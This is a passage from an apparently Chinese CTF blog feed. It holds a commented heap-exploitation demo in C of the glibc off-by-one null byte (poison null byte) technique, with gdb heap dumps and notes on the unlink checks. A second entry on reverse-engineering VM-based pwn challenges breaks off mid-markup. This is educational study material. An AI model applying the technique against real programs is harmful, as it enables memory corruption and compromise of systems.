class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>real_a_size<span class="token punctuation">)</span><span class="token punctuation">;</span>  b <span class="token operator">=</span> <span class="token punctuation">(</span>uint8_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//这个chunk用来伪造</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"b: %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>  c <span class="token operator">=</span> <span class="token punctuation">(</span>uint8_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//这个最后才会用到</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"c: %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>  barrier <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//防止被topchunk 合并</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span>    <span class="token constant">stderr</span><span class="token punctuation">,</span>    <span class="token string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span>    <span class="token string">"The barrier is not strictly necessary, but makes things less confusing\n"</span><span class="token punctuation">,</span>    barrier<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span>    <span class="token string">"In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != "</span>    <span class="token string">"prev_size (next_chunk(P))'\n"</span><span class="token punctuation">,</span>    <span class="token number">1uLL</span><span class="token punctuation">,</span>    <span class="token number">0x8FuLL</span><span class="token punctuation">,</span>    <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>b <span class="token operator">+</span> <span class="token number">0x3E</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x200LL</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//正常写（真正的chunk大小是0x210，在b+0x3e*8,是如果chunk b是0x200大小的话对应下一个chunk的pre_size位）</span>  <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">//把整个b放入unsorted bin</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>b <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"b.size is: (0x200 + 0x10) | prev_in_use\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x28uLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x41uLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//修改b的size位和inuse位（只需要改一个字节）（b的size位变成了0x200）</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>b <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"c.prev_size is %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>c <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span>    <span class="token constant">stderr</span><span class="token punctuation">,</span>    <span class="token string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span><span class="token punctuation">,</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>b <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>b<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>b <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  b1 <span class="token operator">=</span> <span class="token punctuation">(</span>uint8_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//分割b得到b的第一块0x110大小</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"b1: %p\n"</span><span class="token punctuation">,</span> b1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span>    <span class="token constant">stderr</span><span class="token punctuation">,</span>    <span class="token string">"Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: %#lx\n"</span><span class="token punctuation">,</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>c <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span>    <span class="token constant">stderr</span><span class="token punctuation">,</span>    <span class="token string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: %lx\n"</span><span class="token punctuation">,</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>c <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"We malloc 'b2', our 'victim' chunk.\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x24uLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  b2 <span class="token operator">=</span> <span class="token punctuation">(</span>uint8_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//分割b  chunk的第二块得到0x90的chunk，分割完之后chunk结构如下图</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"b2: %p\n"</span><span class="token punctuation">,</span> b2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Current b2 content:\n%s\n"</span><span class="token punctuation">,</span> b2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span>    <span class="token string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span><span class="token punctuation">,</span>    <span class="token number">1uLL</span><span class="token punctuation">,</span>    <span class="token number">0x61uLL</span><span class="token punctuation">,</span>    <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">//b1回到unsorted bin中</span>  <span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//释放c引起chunk合并(是在没有修改任何东西的时候写入的c chunk的prev_size位，导致合并的应该是原来的0x210的chunk，合并成0x320大小的chunk)</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x2CuLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  d <span class="token operator">=</span> <span class="token punctuation">(</span>uint8_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//d获取到未分配的b到c的一大块区域</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"d: %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Now 'd' and 'b2' overlap.\n"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x1AuLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">0x300uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"New b2 content:\n%s\n"</span><span class="token punctuation">,</span> b2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span>    <span class="token string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explan"</span>    <span class="token string">"ation of this technique.\n"</span><span class="token punctuation">,</span>    <span class="token number">1uLL</span><span class="token punctuation">,</span>    <span class="token number">0x8DuLL</span><span class="token punctuation">,</span>    <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>  *((_QWORD *)b + 0x3E) = 0x200LL;</code>运行之后的布局</p><pre class=" language-bash"><code class="language-bash">0x555557083320: 0x0000000000000200      0x0000000000000000 chunk b末尾0x555557083330: 0x0000000000000000      0x0000000000000111  chunk c</code></pre><p>接下来释放b(b进入unsorted bin)，释放之后的布局为</p><pre class=" language-bash"><code class="language-bash">0x555557083320: 0x0000000000000200      0x0000000000000000   chunk b0x555557083330: 0x0000000000000210      0x0000000000000110   chunk c</code></pre><p>修改size和previnuse然后申请b1,修改b和c的交叉点结构如下</p><pre class=" language-bash"><code class="language-bash">0x555557083320: 0x00000000000000f0      0x0000000000000000   chunk b<span class="token punctuation">(</span>被切割并且修改这里的size<span class="token punctuation">)</span>0x555557083330: 0x0000000000000210      0x0000000000000110  chunk c</code></pre><p>分配完b2得到的chunk结构是</p><pre class=" language-c"><code class="language-c"><span class="token number">0x555555757110</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000111</span>    b1<span class="token number">0x555555757120</span><span class="token punctuation">:</span> <span class="token number">0x00007ffff7dd1d68</span>      <span class="token number">0x00007ffff7dd1d68</span><span class="token number">0x555555757130</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757140</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757150</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757160</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757170</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757180</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757190</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557571a0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557571b0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557571c0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557571d0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557571e0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557571f0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757200</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757210</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757220</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000091</span>   b2<span class="token number">0x555555757230</span><span class="token punctuation">:</span> <span class="token number">0x00007ffff7dd1b78</span>      <span class="token number">0x00007ffff7dd1b78</span><span class="token number">0x555555757240</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757250</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757260</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757270</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757280</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757290</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557572a0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557572b0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000061</span>   unsorted<span class="token number">0x5555557572c0</span><span class="token punctuation">:</span> <span class="token number">0x00007ffff7dd1b78</span>      <span class="token number">0x00007ffff7dd1b78</span><span class="token number">0x5555557572d0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557572e0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x5555557572f0</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757300</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000000</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757310</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000060</span>      <span class="token number">0x0000000000000000</span><span class="token number">0x555555757320</span><span class="token punctuation">:</span> <span class="token number">0x0000000000000210</span>      <span class="token number">0x0000000000000110</span>  c</code></pre><p>接下来释放c和b1，能把整个c，b(包含b1,b2,unsorted)全部合并放入unsorted bin</p><h3 id="深入思考"><a href="#深入思考" class="headerlink" title="深入思考"></a>深入思考</h3><p>如果只释放c不释放b1的话会崩溃，追踪崩溃找到下面代码，释放c的时候会检查前面的chunk是否在使用，没有使用(这个是满足的)将会进行unlink(这里不释放p1是过不了unlink的检查的)</p><pre class=" language-c"><code class="language-c">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">prev_inuse</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      prevsize <span class="token operator">=</span> p<span class="token operator">-></span>prev_size<span class="token punctuation">;</span>      size <span class="token operator">+</span><span class="token operator">=</span> prevsize<span class="token punctuation">;</span>      p <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span> prevsize<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unlink</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> p<span class="token punctuation">,</span> bck<span class="token punctuation">,</span> fwd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>如果没有<code>  *((_QWORD *)b + 0x3E) = 0x200LL;</code>这个size实际上也是可行的。<br>在libc2.23中在切割chunk的时候不会检查next_chunk的prev_size位，会把切割后的size大小写到对应位置。在注释掉代码中<br><code>  *((_QWORD *)b + 0x3E) = 0x200LL;</code>语句之后，申请b1之后的堆空间如下图所示</p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> x /70xg b0x555556eaa130: 0x00007f2a49e20d68      0x00007f2a49e20d680x555556eaa140: 0x0000000000000000      0x00000000000000000x555556eaa150: 0x0000000000000000      0x00000000000000000x555556eaa160: 0x0000000000000000      0x00000000000000000x555556eaa170: 0x0000000000000000      0x00000000000000000x555556eaa180: 0x0000000000000000      0x00000000000000000x555556eaa190: 0x0000000000000000      0x00000000000000000x555556eaa1a0: 0x0000000000000000      0x00000000000000000x555556eaa1b0: 0x0000000000000000      0x00000000000000000x555556eaa1c0: 0x0000000000000000      0x00000000000000000x555556eaa1d0: 0x0000000000000000      0x00000000000000000x555556eaa1e0: 0x0000000000000000      0x00000000000000000x555556eaa1f0: 0x0000000000000000      0x00000000000000000x555556eaa200: 0x0000000000000000      0x00000000000000000x555556eaa210: 0x0000000000000000      0x00000000000000000x555556eaa220: 0x0000000000000000      0x00000000000000000x555556eaa230: 0x0000000000000000      0x00000000000000f10x555556eaa240: 0x00007f2a49e20b78      0x00007f2a49e20b780x555556eaa250: 0x0000000000000000      0x00000000000000000x555556eaa260: 0x0000000000000000      0x00000000000000000x555556eaa270: 0x0000000000000000      0x00000000000000000x555556eaa280: 0x0000000000000000      0x00000000000000000x555556eaa290: 0x0000000000000000      0x00000000000000000x555556eaa2a0: 0x0000000000000000      0x00000000000000000x555556eaa2b0: 0x0000000000000000      0x00000000000000000x555556eaa2c0: 0x0000000000000000      0x00000000000000000x555556eaa2d0: 0x0000000000000000      0x00000000000000000x555556eaa2e0: 0x0000000000000000      0x00000000000000000x555556eaa2f0: 0x0000000000000000      0x00000000000000000x555556eaa300: 0x0000000000000000      0x00000000000000000x555556eaa310: 0x0000000000000000      0x00000000000000000x555556eaa320: 0x00000000000000f0      0x00000000000000000x555556eaa330: 0x0000000000000210      0x0000000000000110</code></pre><h3 id="利用过程整理"><a href="#利用过程整理" class="headerlink" title="利用过程整理"></a>利用过程整理</h3><p><img src="https://img-blog.csdnimg.cn/20200311152258940.png" alt="在这里插入图片描述"><br>这里写入的size还在b的空间中，是将要伪造的b的size大小，位置要满足下一步伪造b的size之后可以作为下一个chunk的prev_size<br><img src="https://img-blog.csdnimg.cn/2020031115230845.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200821144837935.png" alt="在这里插入图片描述"></p><p>之后申请chunk切割b，整个b分割成了3块<br>0x0000000000000111    b1<br>0x0000000000000091   b2<br>0x0000000000000061   unsorted</p><p>接下来释放b1，c1，当释放c1的时候进行chunk合并，得到了0x320的chunk。<br>之后d = (uint8_t *)malloc(0x300uLL)会申请到b和c 两个chunk的空间</p><p>总结：<br>需要条件：1.有off_by_one_null漏洞<br>                  2.是unsorted bin的漏洞利用<br>结果：可以申请到两个已经被释放空间中间的已经被申请过的chunk(造成溢出，修改数据)</p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmpwn总结</title>
      <link href="2020/11/18/vmpwn%E6%80%BB%E7%BB%93/"/>
      <url>2020/11/18/vmpwn%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="分析各种存储器格式"><a href="#分析各种存储器格式" class="headerlink" title="分析各种存储器格式"></a>分析各种存储器格式</h1><h2 id="初始化结构"><a href="#初始化结构" class="headerlink" title="初始化结构"></a>初始化结构</h2><pre class=" language-c"><code class="language-c">_DWORD <span class="token operator">*</span><span class="token function">sub_8049570</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  _DWORD <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>  v0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x2Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> v0<span class="token punctuation">;</span>  <span class="token operator">*</span>v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v0<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">4u</span><span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x100</span>  v1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0xFC</span><span class="token punctuation">;</span>  v1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">252</span><span class="token punctuation">;</span>  v1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>通过初始化结构定义结构体，每个字段的大小，类型</p><h2 id="补充结构体字段命名"><a href="#补充结构体字段命名" class="headerlink" title="补充结构体字段命名"></a>补充结构体字段命名</h2><p>然后通过指令分析确定各个字段的含义</p><p>像这种进行数学运算的肯定是寄存器</p><pre class=" language-c"><code class="language-c"><span class="token function">sub_106C</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data1<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// *a1 += *a2;</span></code></pre><p>包含加加减减操作，都是取指指令肯定是栈</p><pre class=" language-c"><code class="language-c"><span class="token function">save_to_qword_203058</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//  *(_DWORD *)(qword_203058 + 4LL * ++esp_dword_203010) = *a1;</span></code></pre><p>对某个内存的访问就是定义的内存</p><pre class=" language-c"><code class="language-c"><span class="token function">load</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data1<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// dword_203060[*a1] = dword_203080[*a2]; 寄存器取出两个索引，从内存取值放入寄存器</span></code></pre><h2 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h2><p>指针和值分开命名</p><p>在命名的时候如果是指针需要在名字里体现出来</p><pre class=" language-c"><code class="language-c"><span class="token function">get_opi_addr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">)</span>ptr<span class="token operator">-></span>buffer_ptr</code></pre><h2 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h2><p>关注点主要是两个</p><ul><li>是指针还是实际的数，在命名上要有体现</li><li>取的数据是一个字节还是四个字节</li></ul><pre class=" language-c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> <span class="token operator">*</span>v20<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr<span class="token operator">-></span>buffer_ptr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> v19<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token operator">-></span>reg_0 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">get_opi_addr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>下面的语句表示一个具体值，表示ptr的某一位的值的某一位的值。</p><pre class=" language-c"><code class="language-c">ptr<span class="token operator">-></span>bufer_ptr<span class="token operator">-></span>field_3和ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>  一样的效果</code></pre><p>下面语句表示ptr的某一位的值+3*(1)（这个值是个指针，1是因为char占一个字节）</p><pre class=" language-c"><code class="language-c"><span class="token 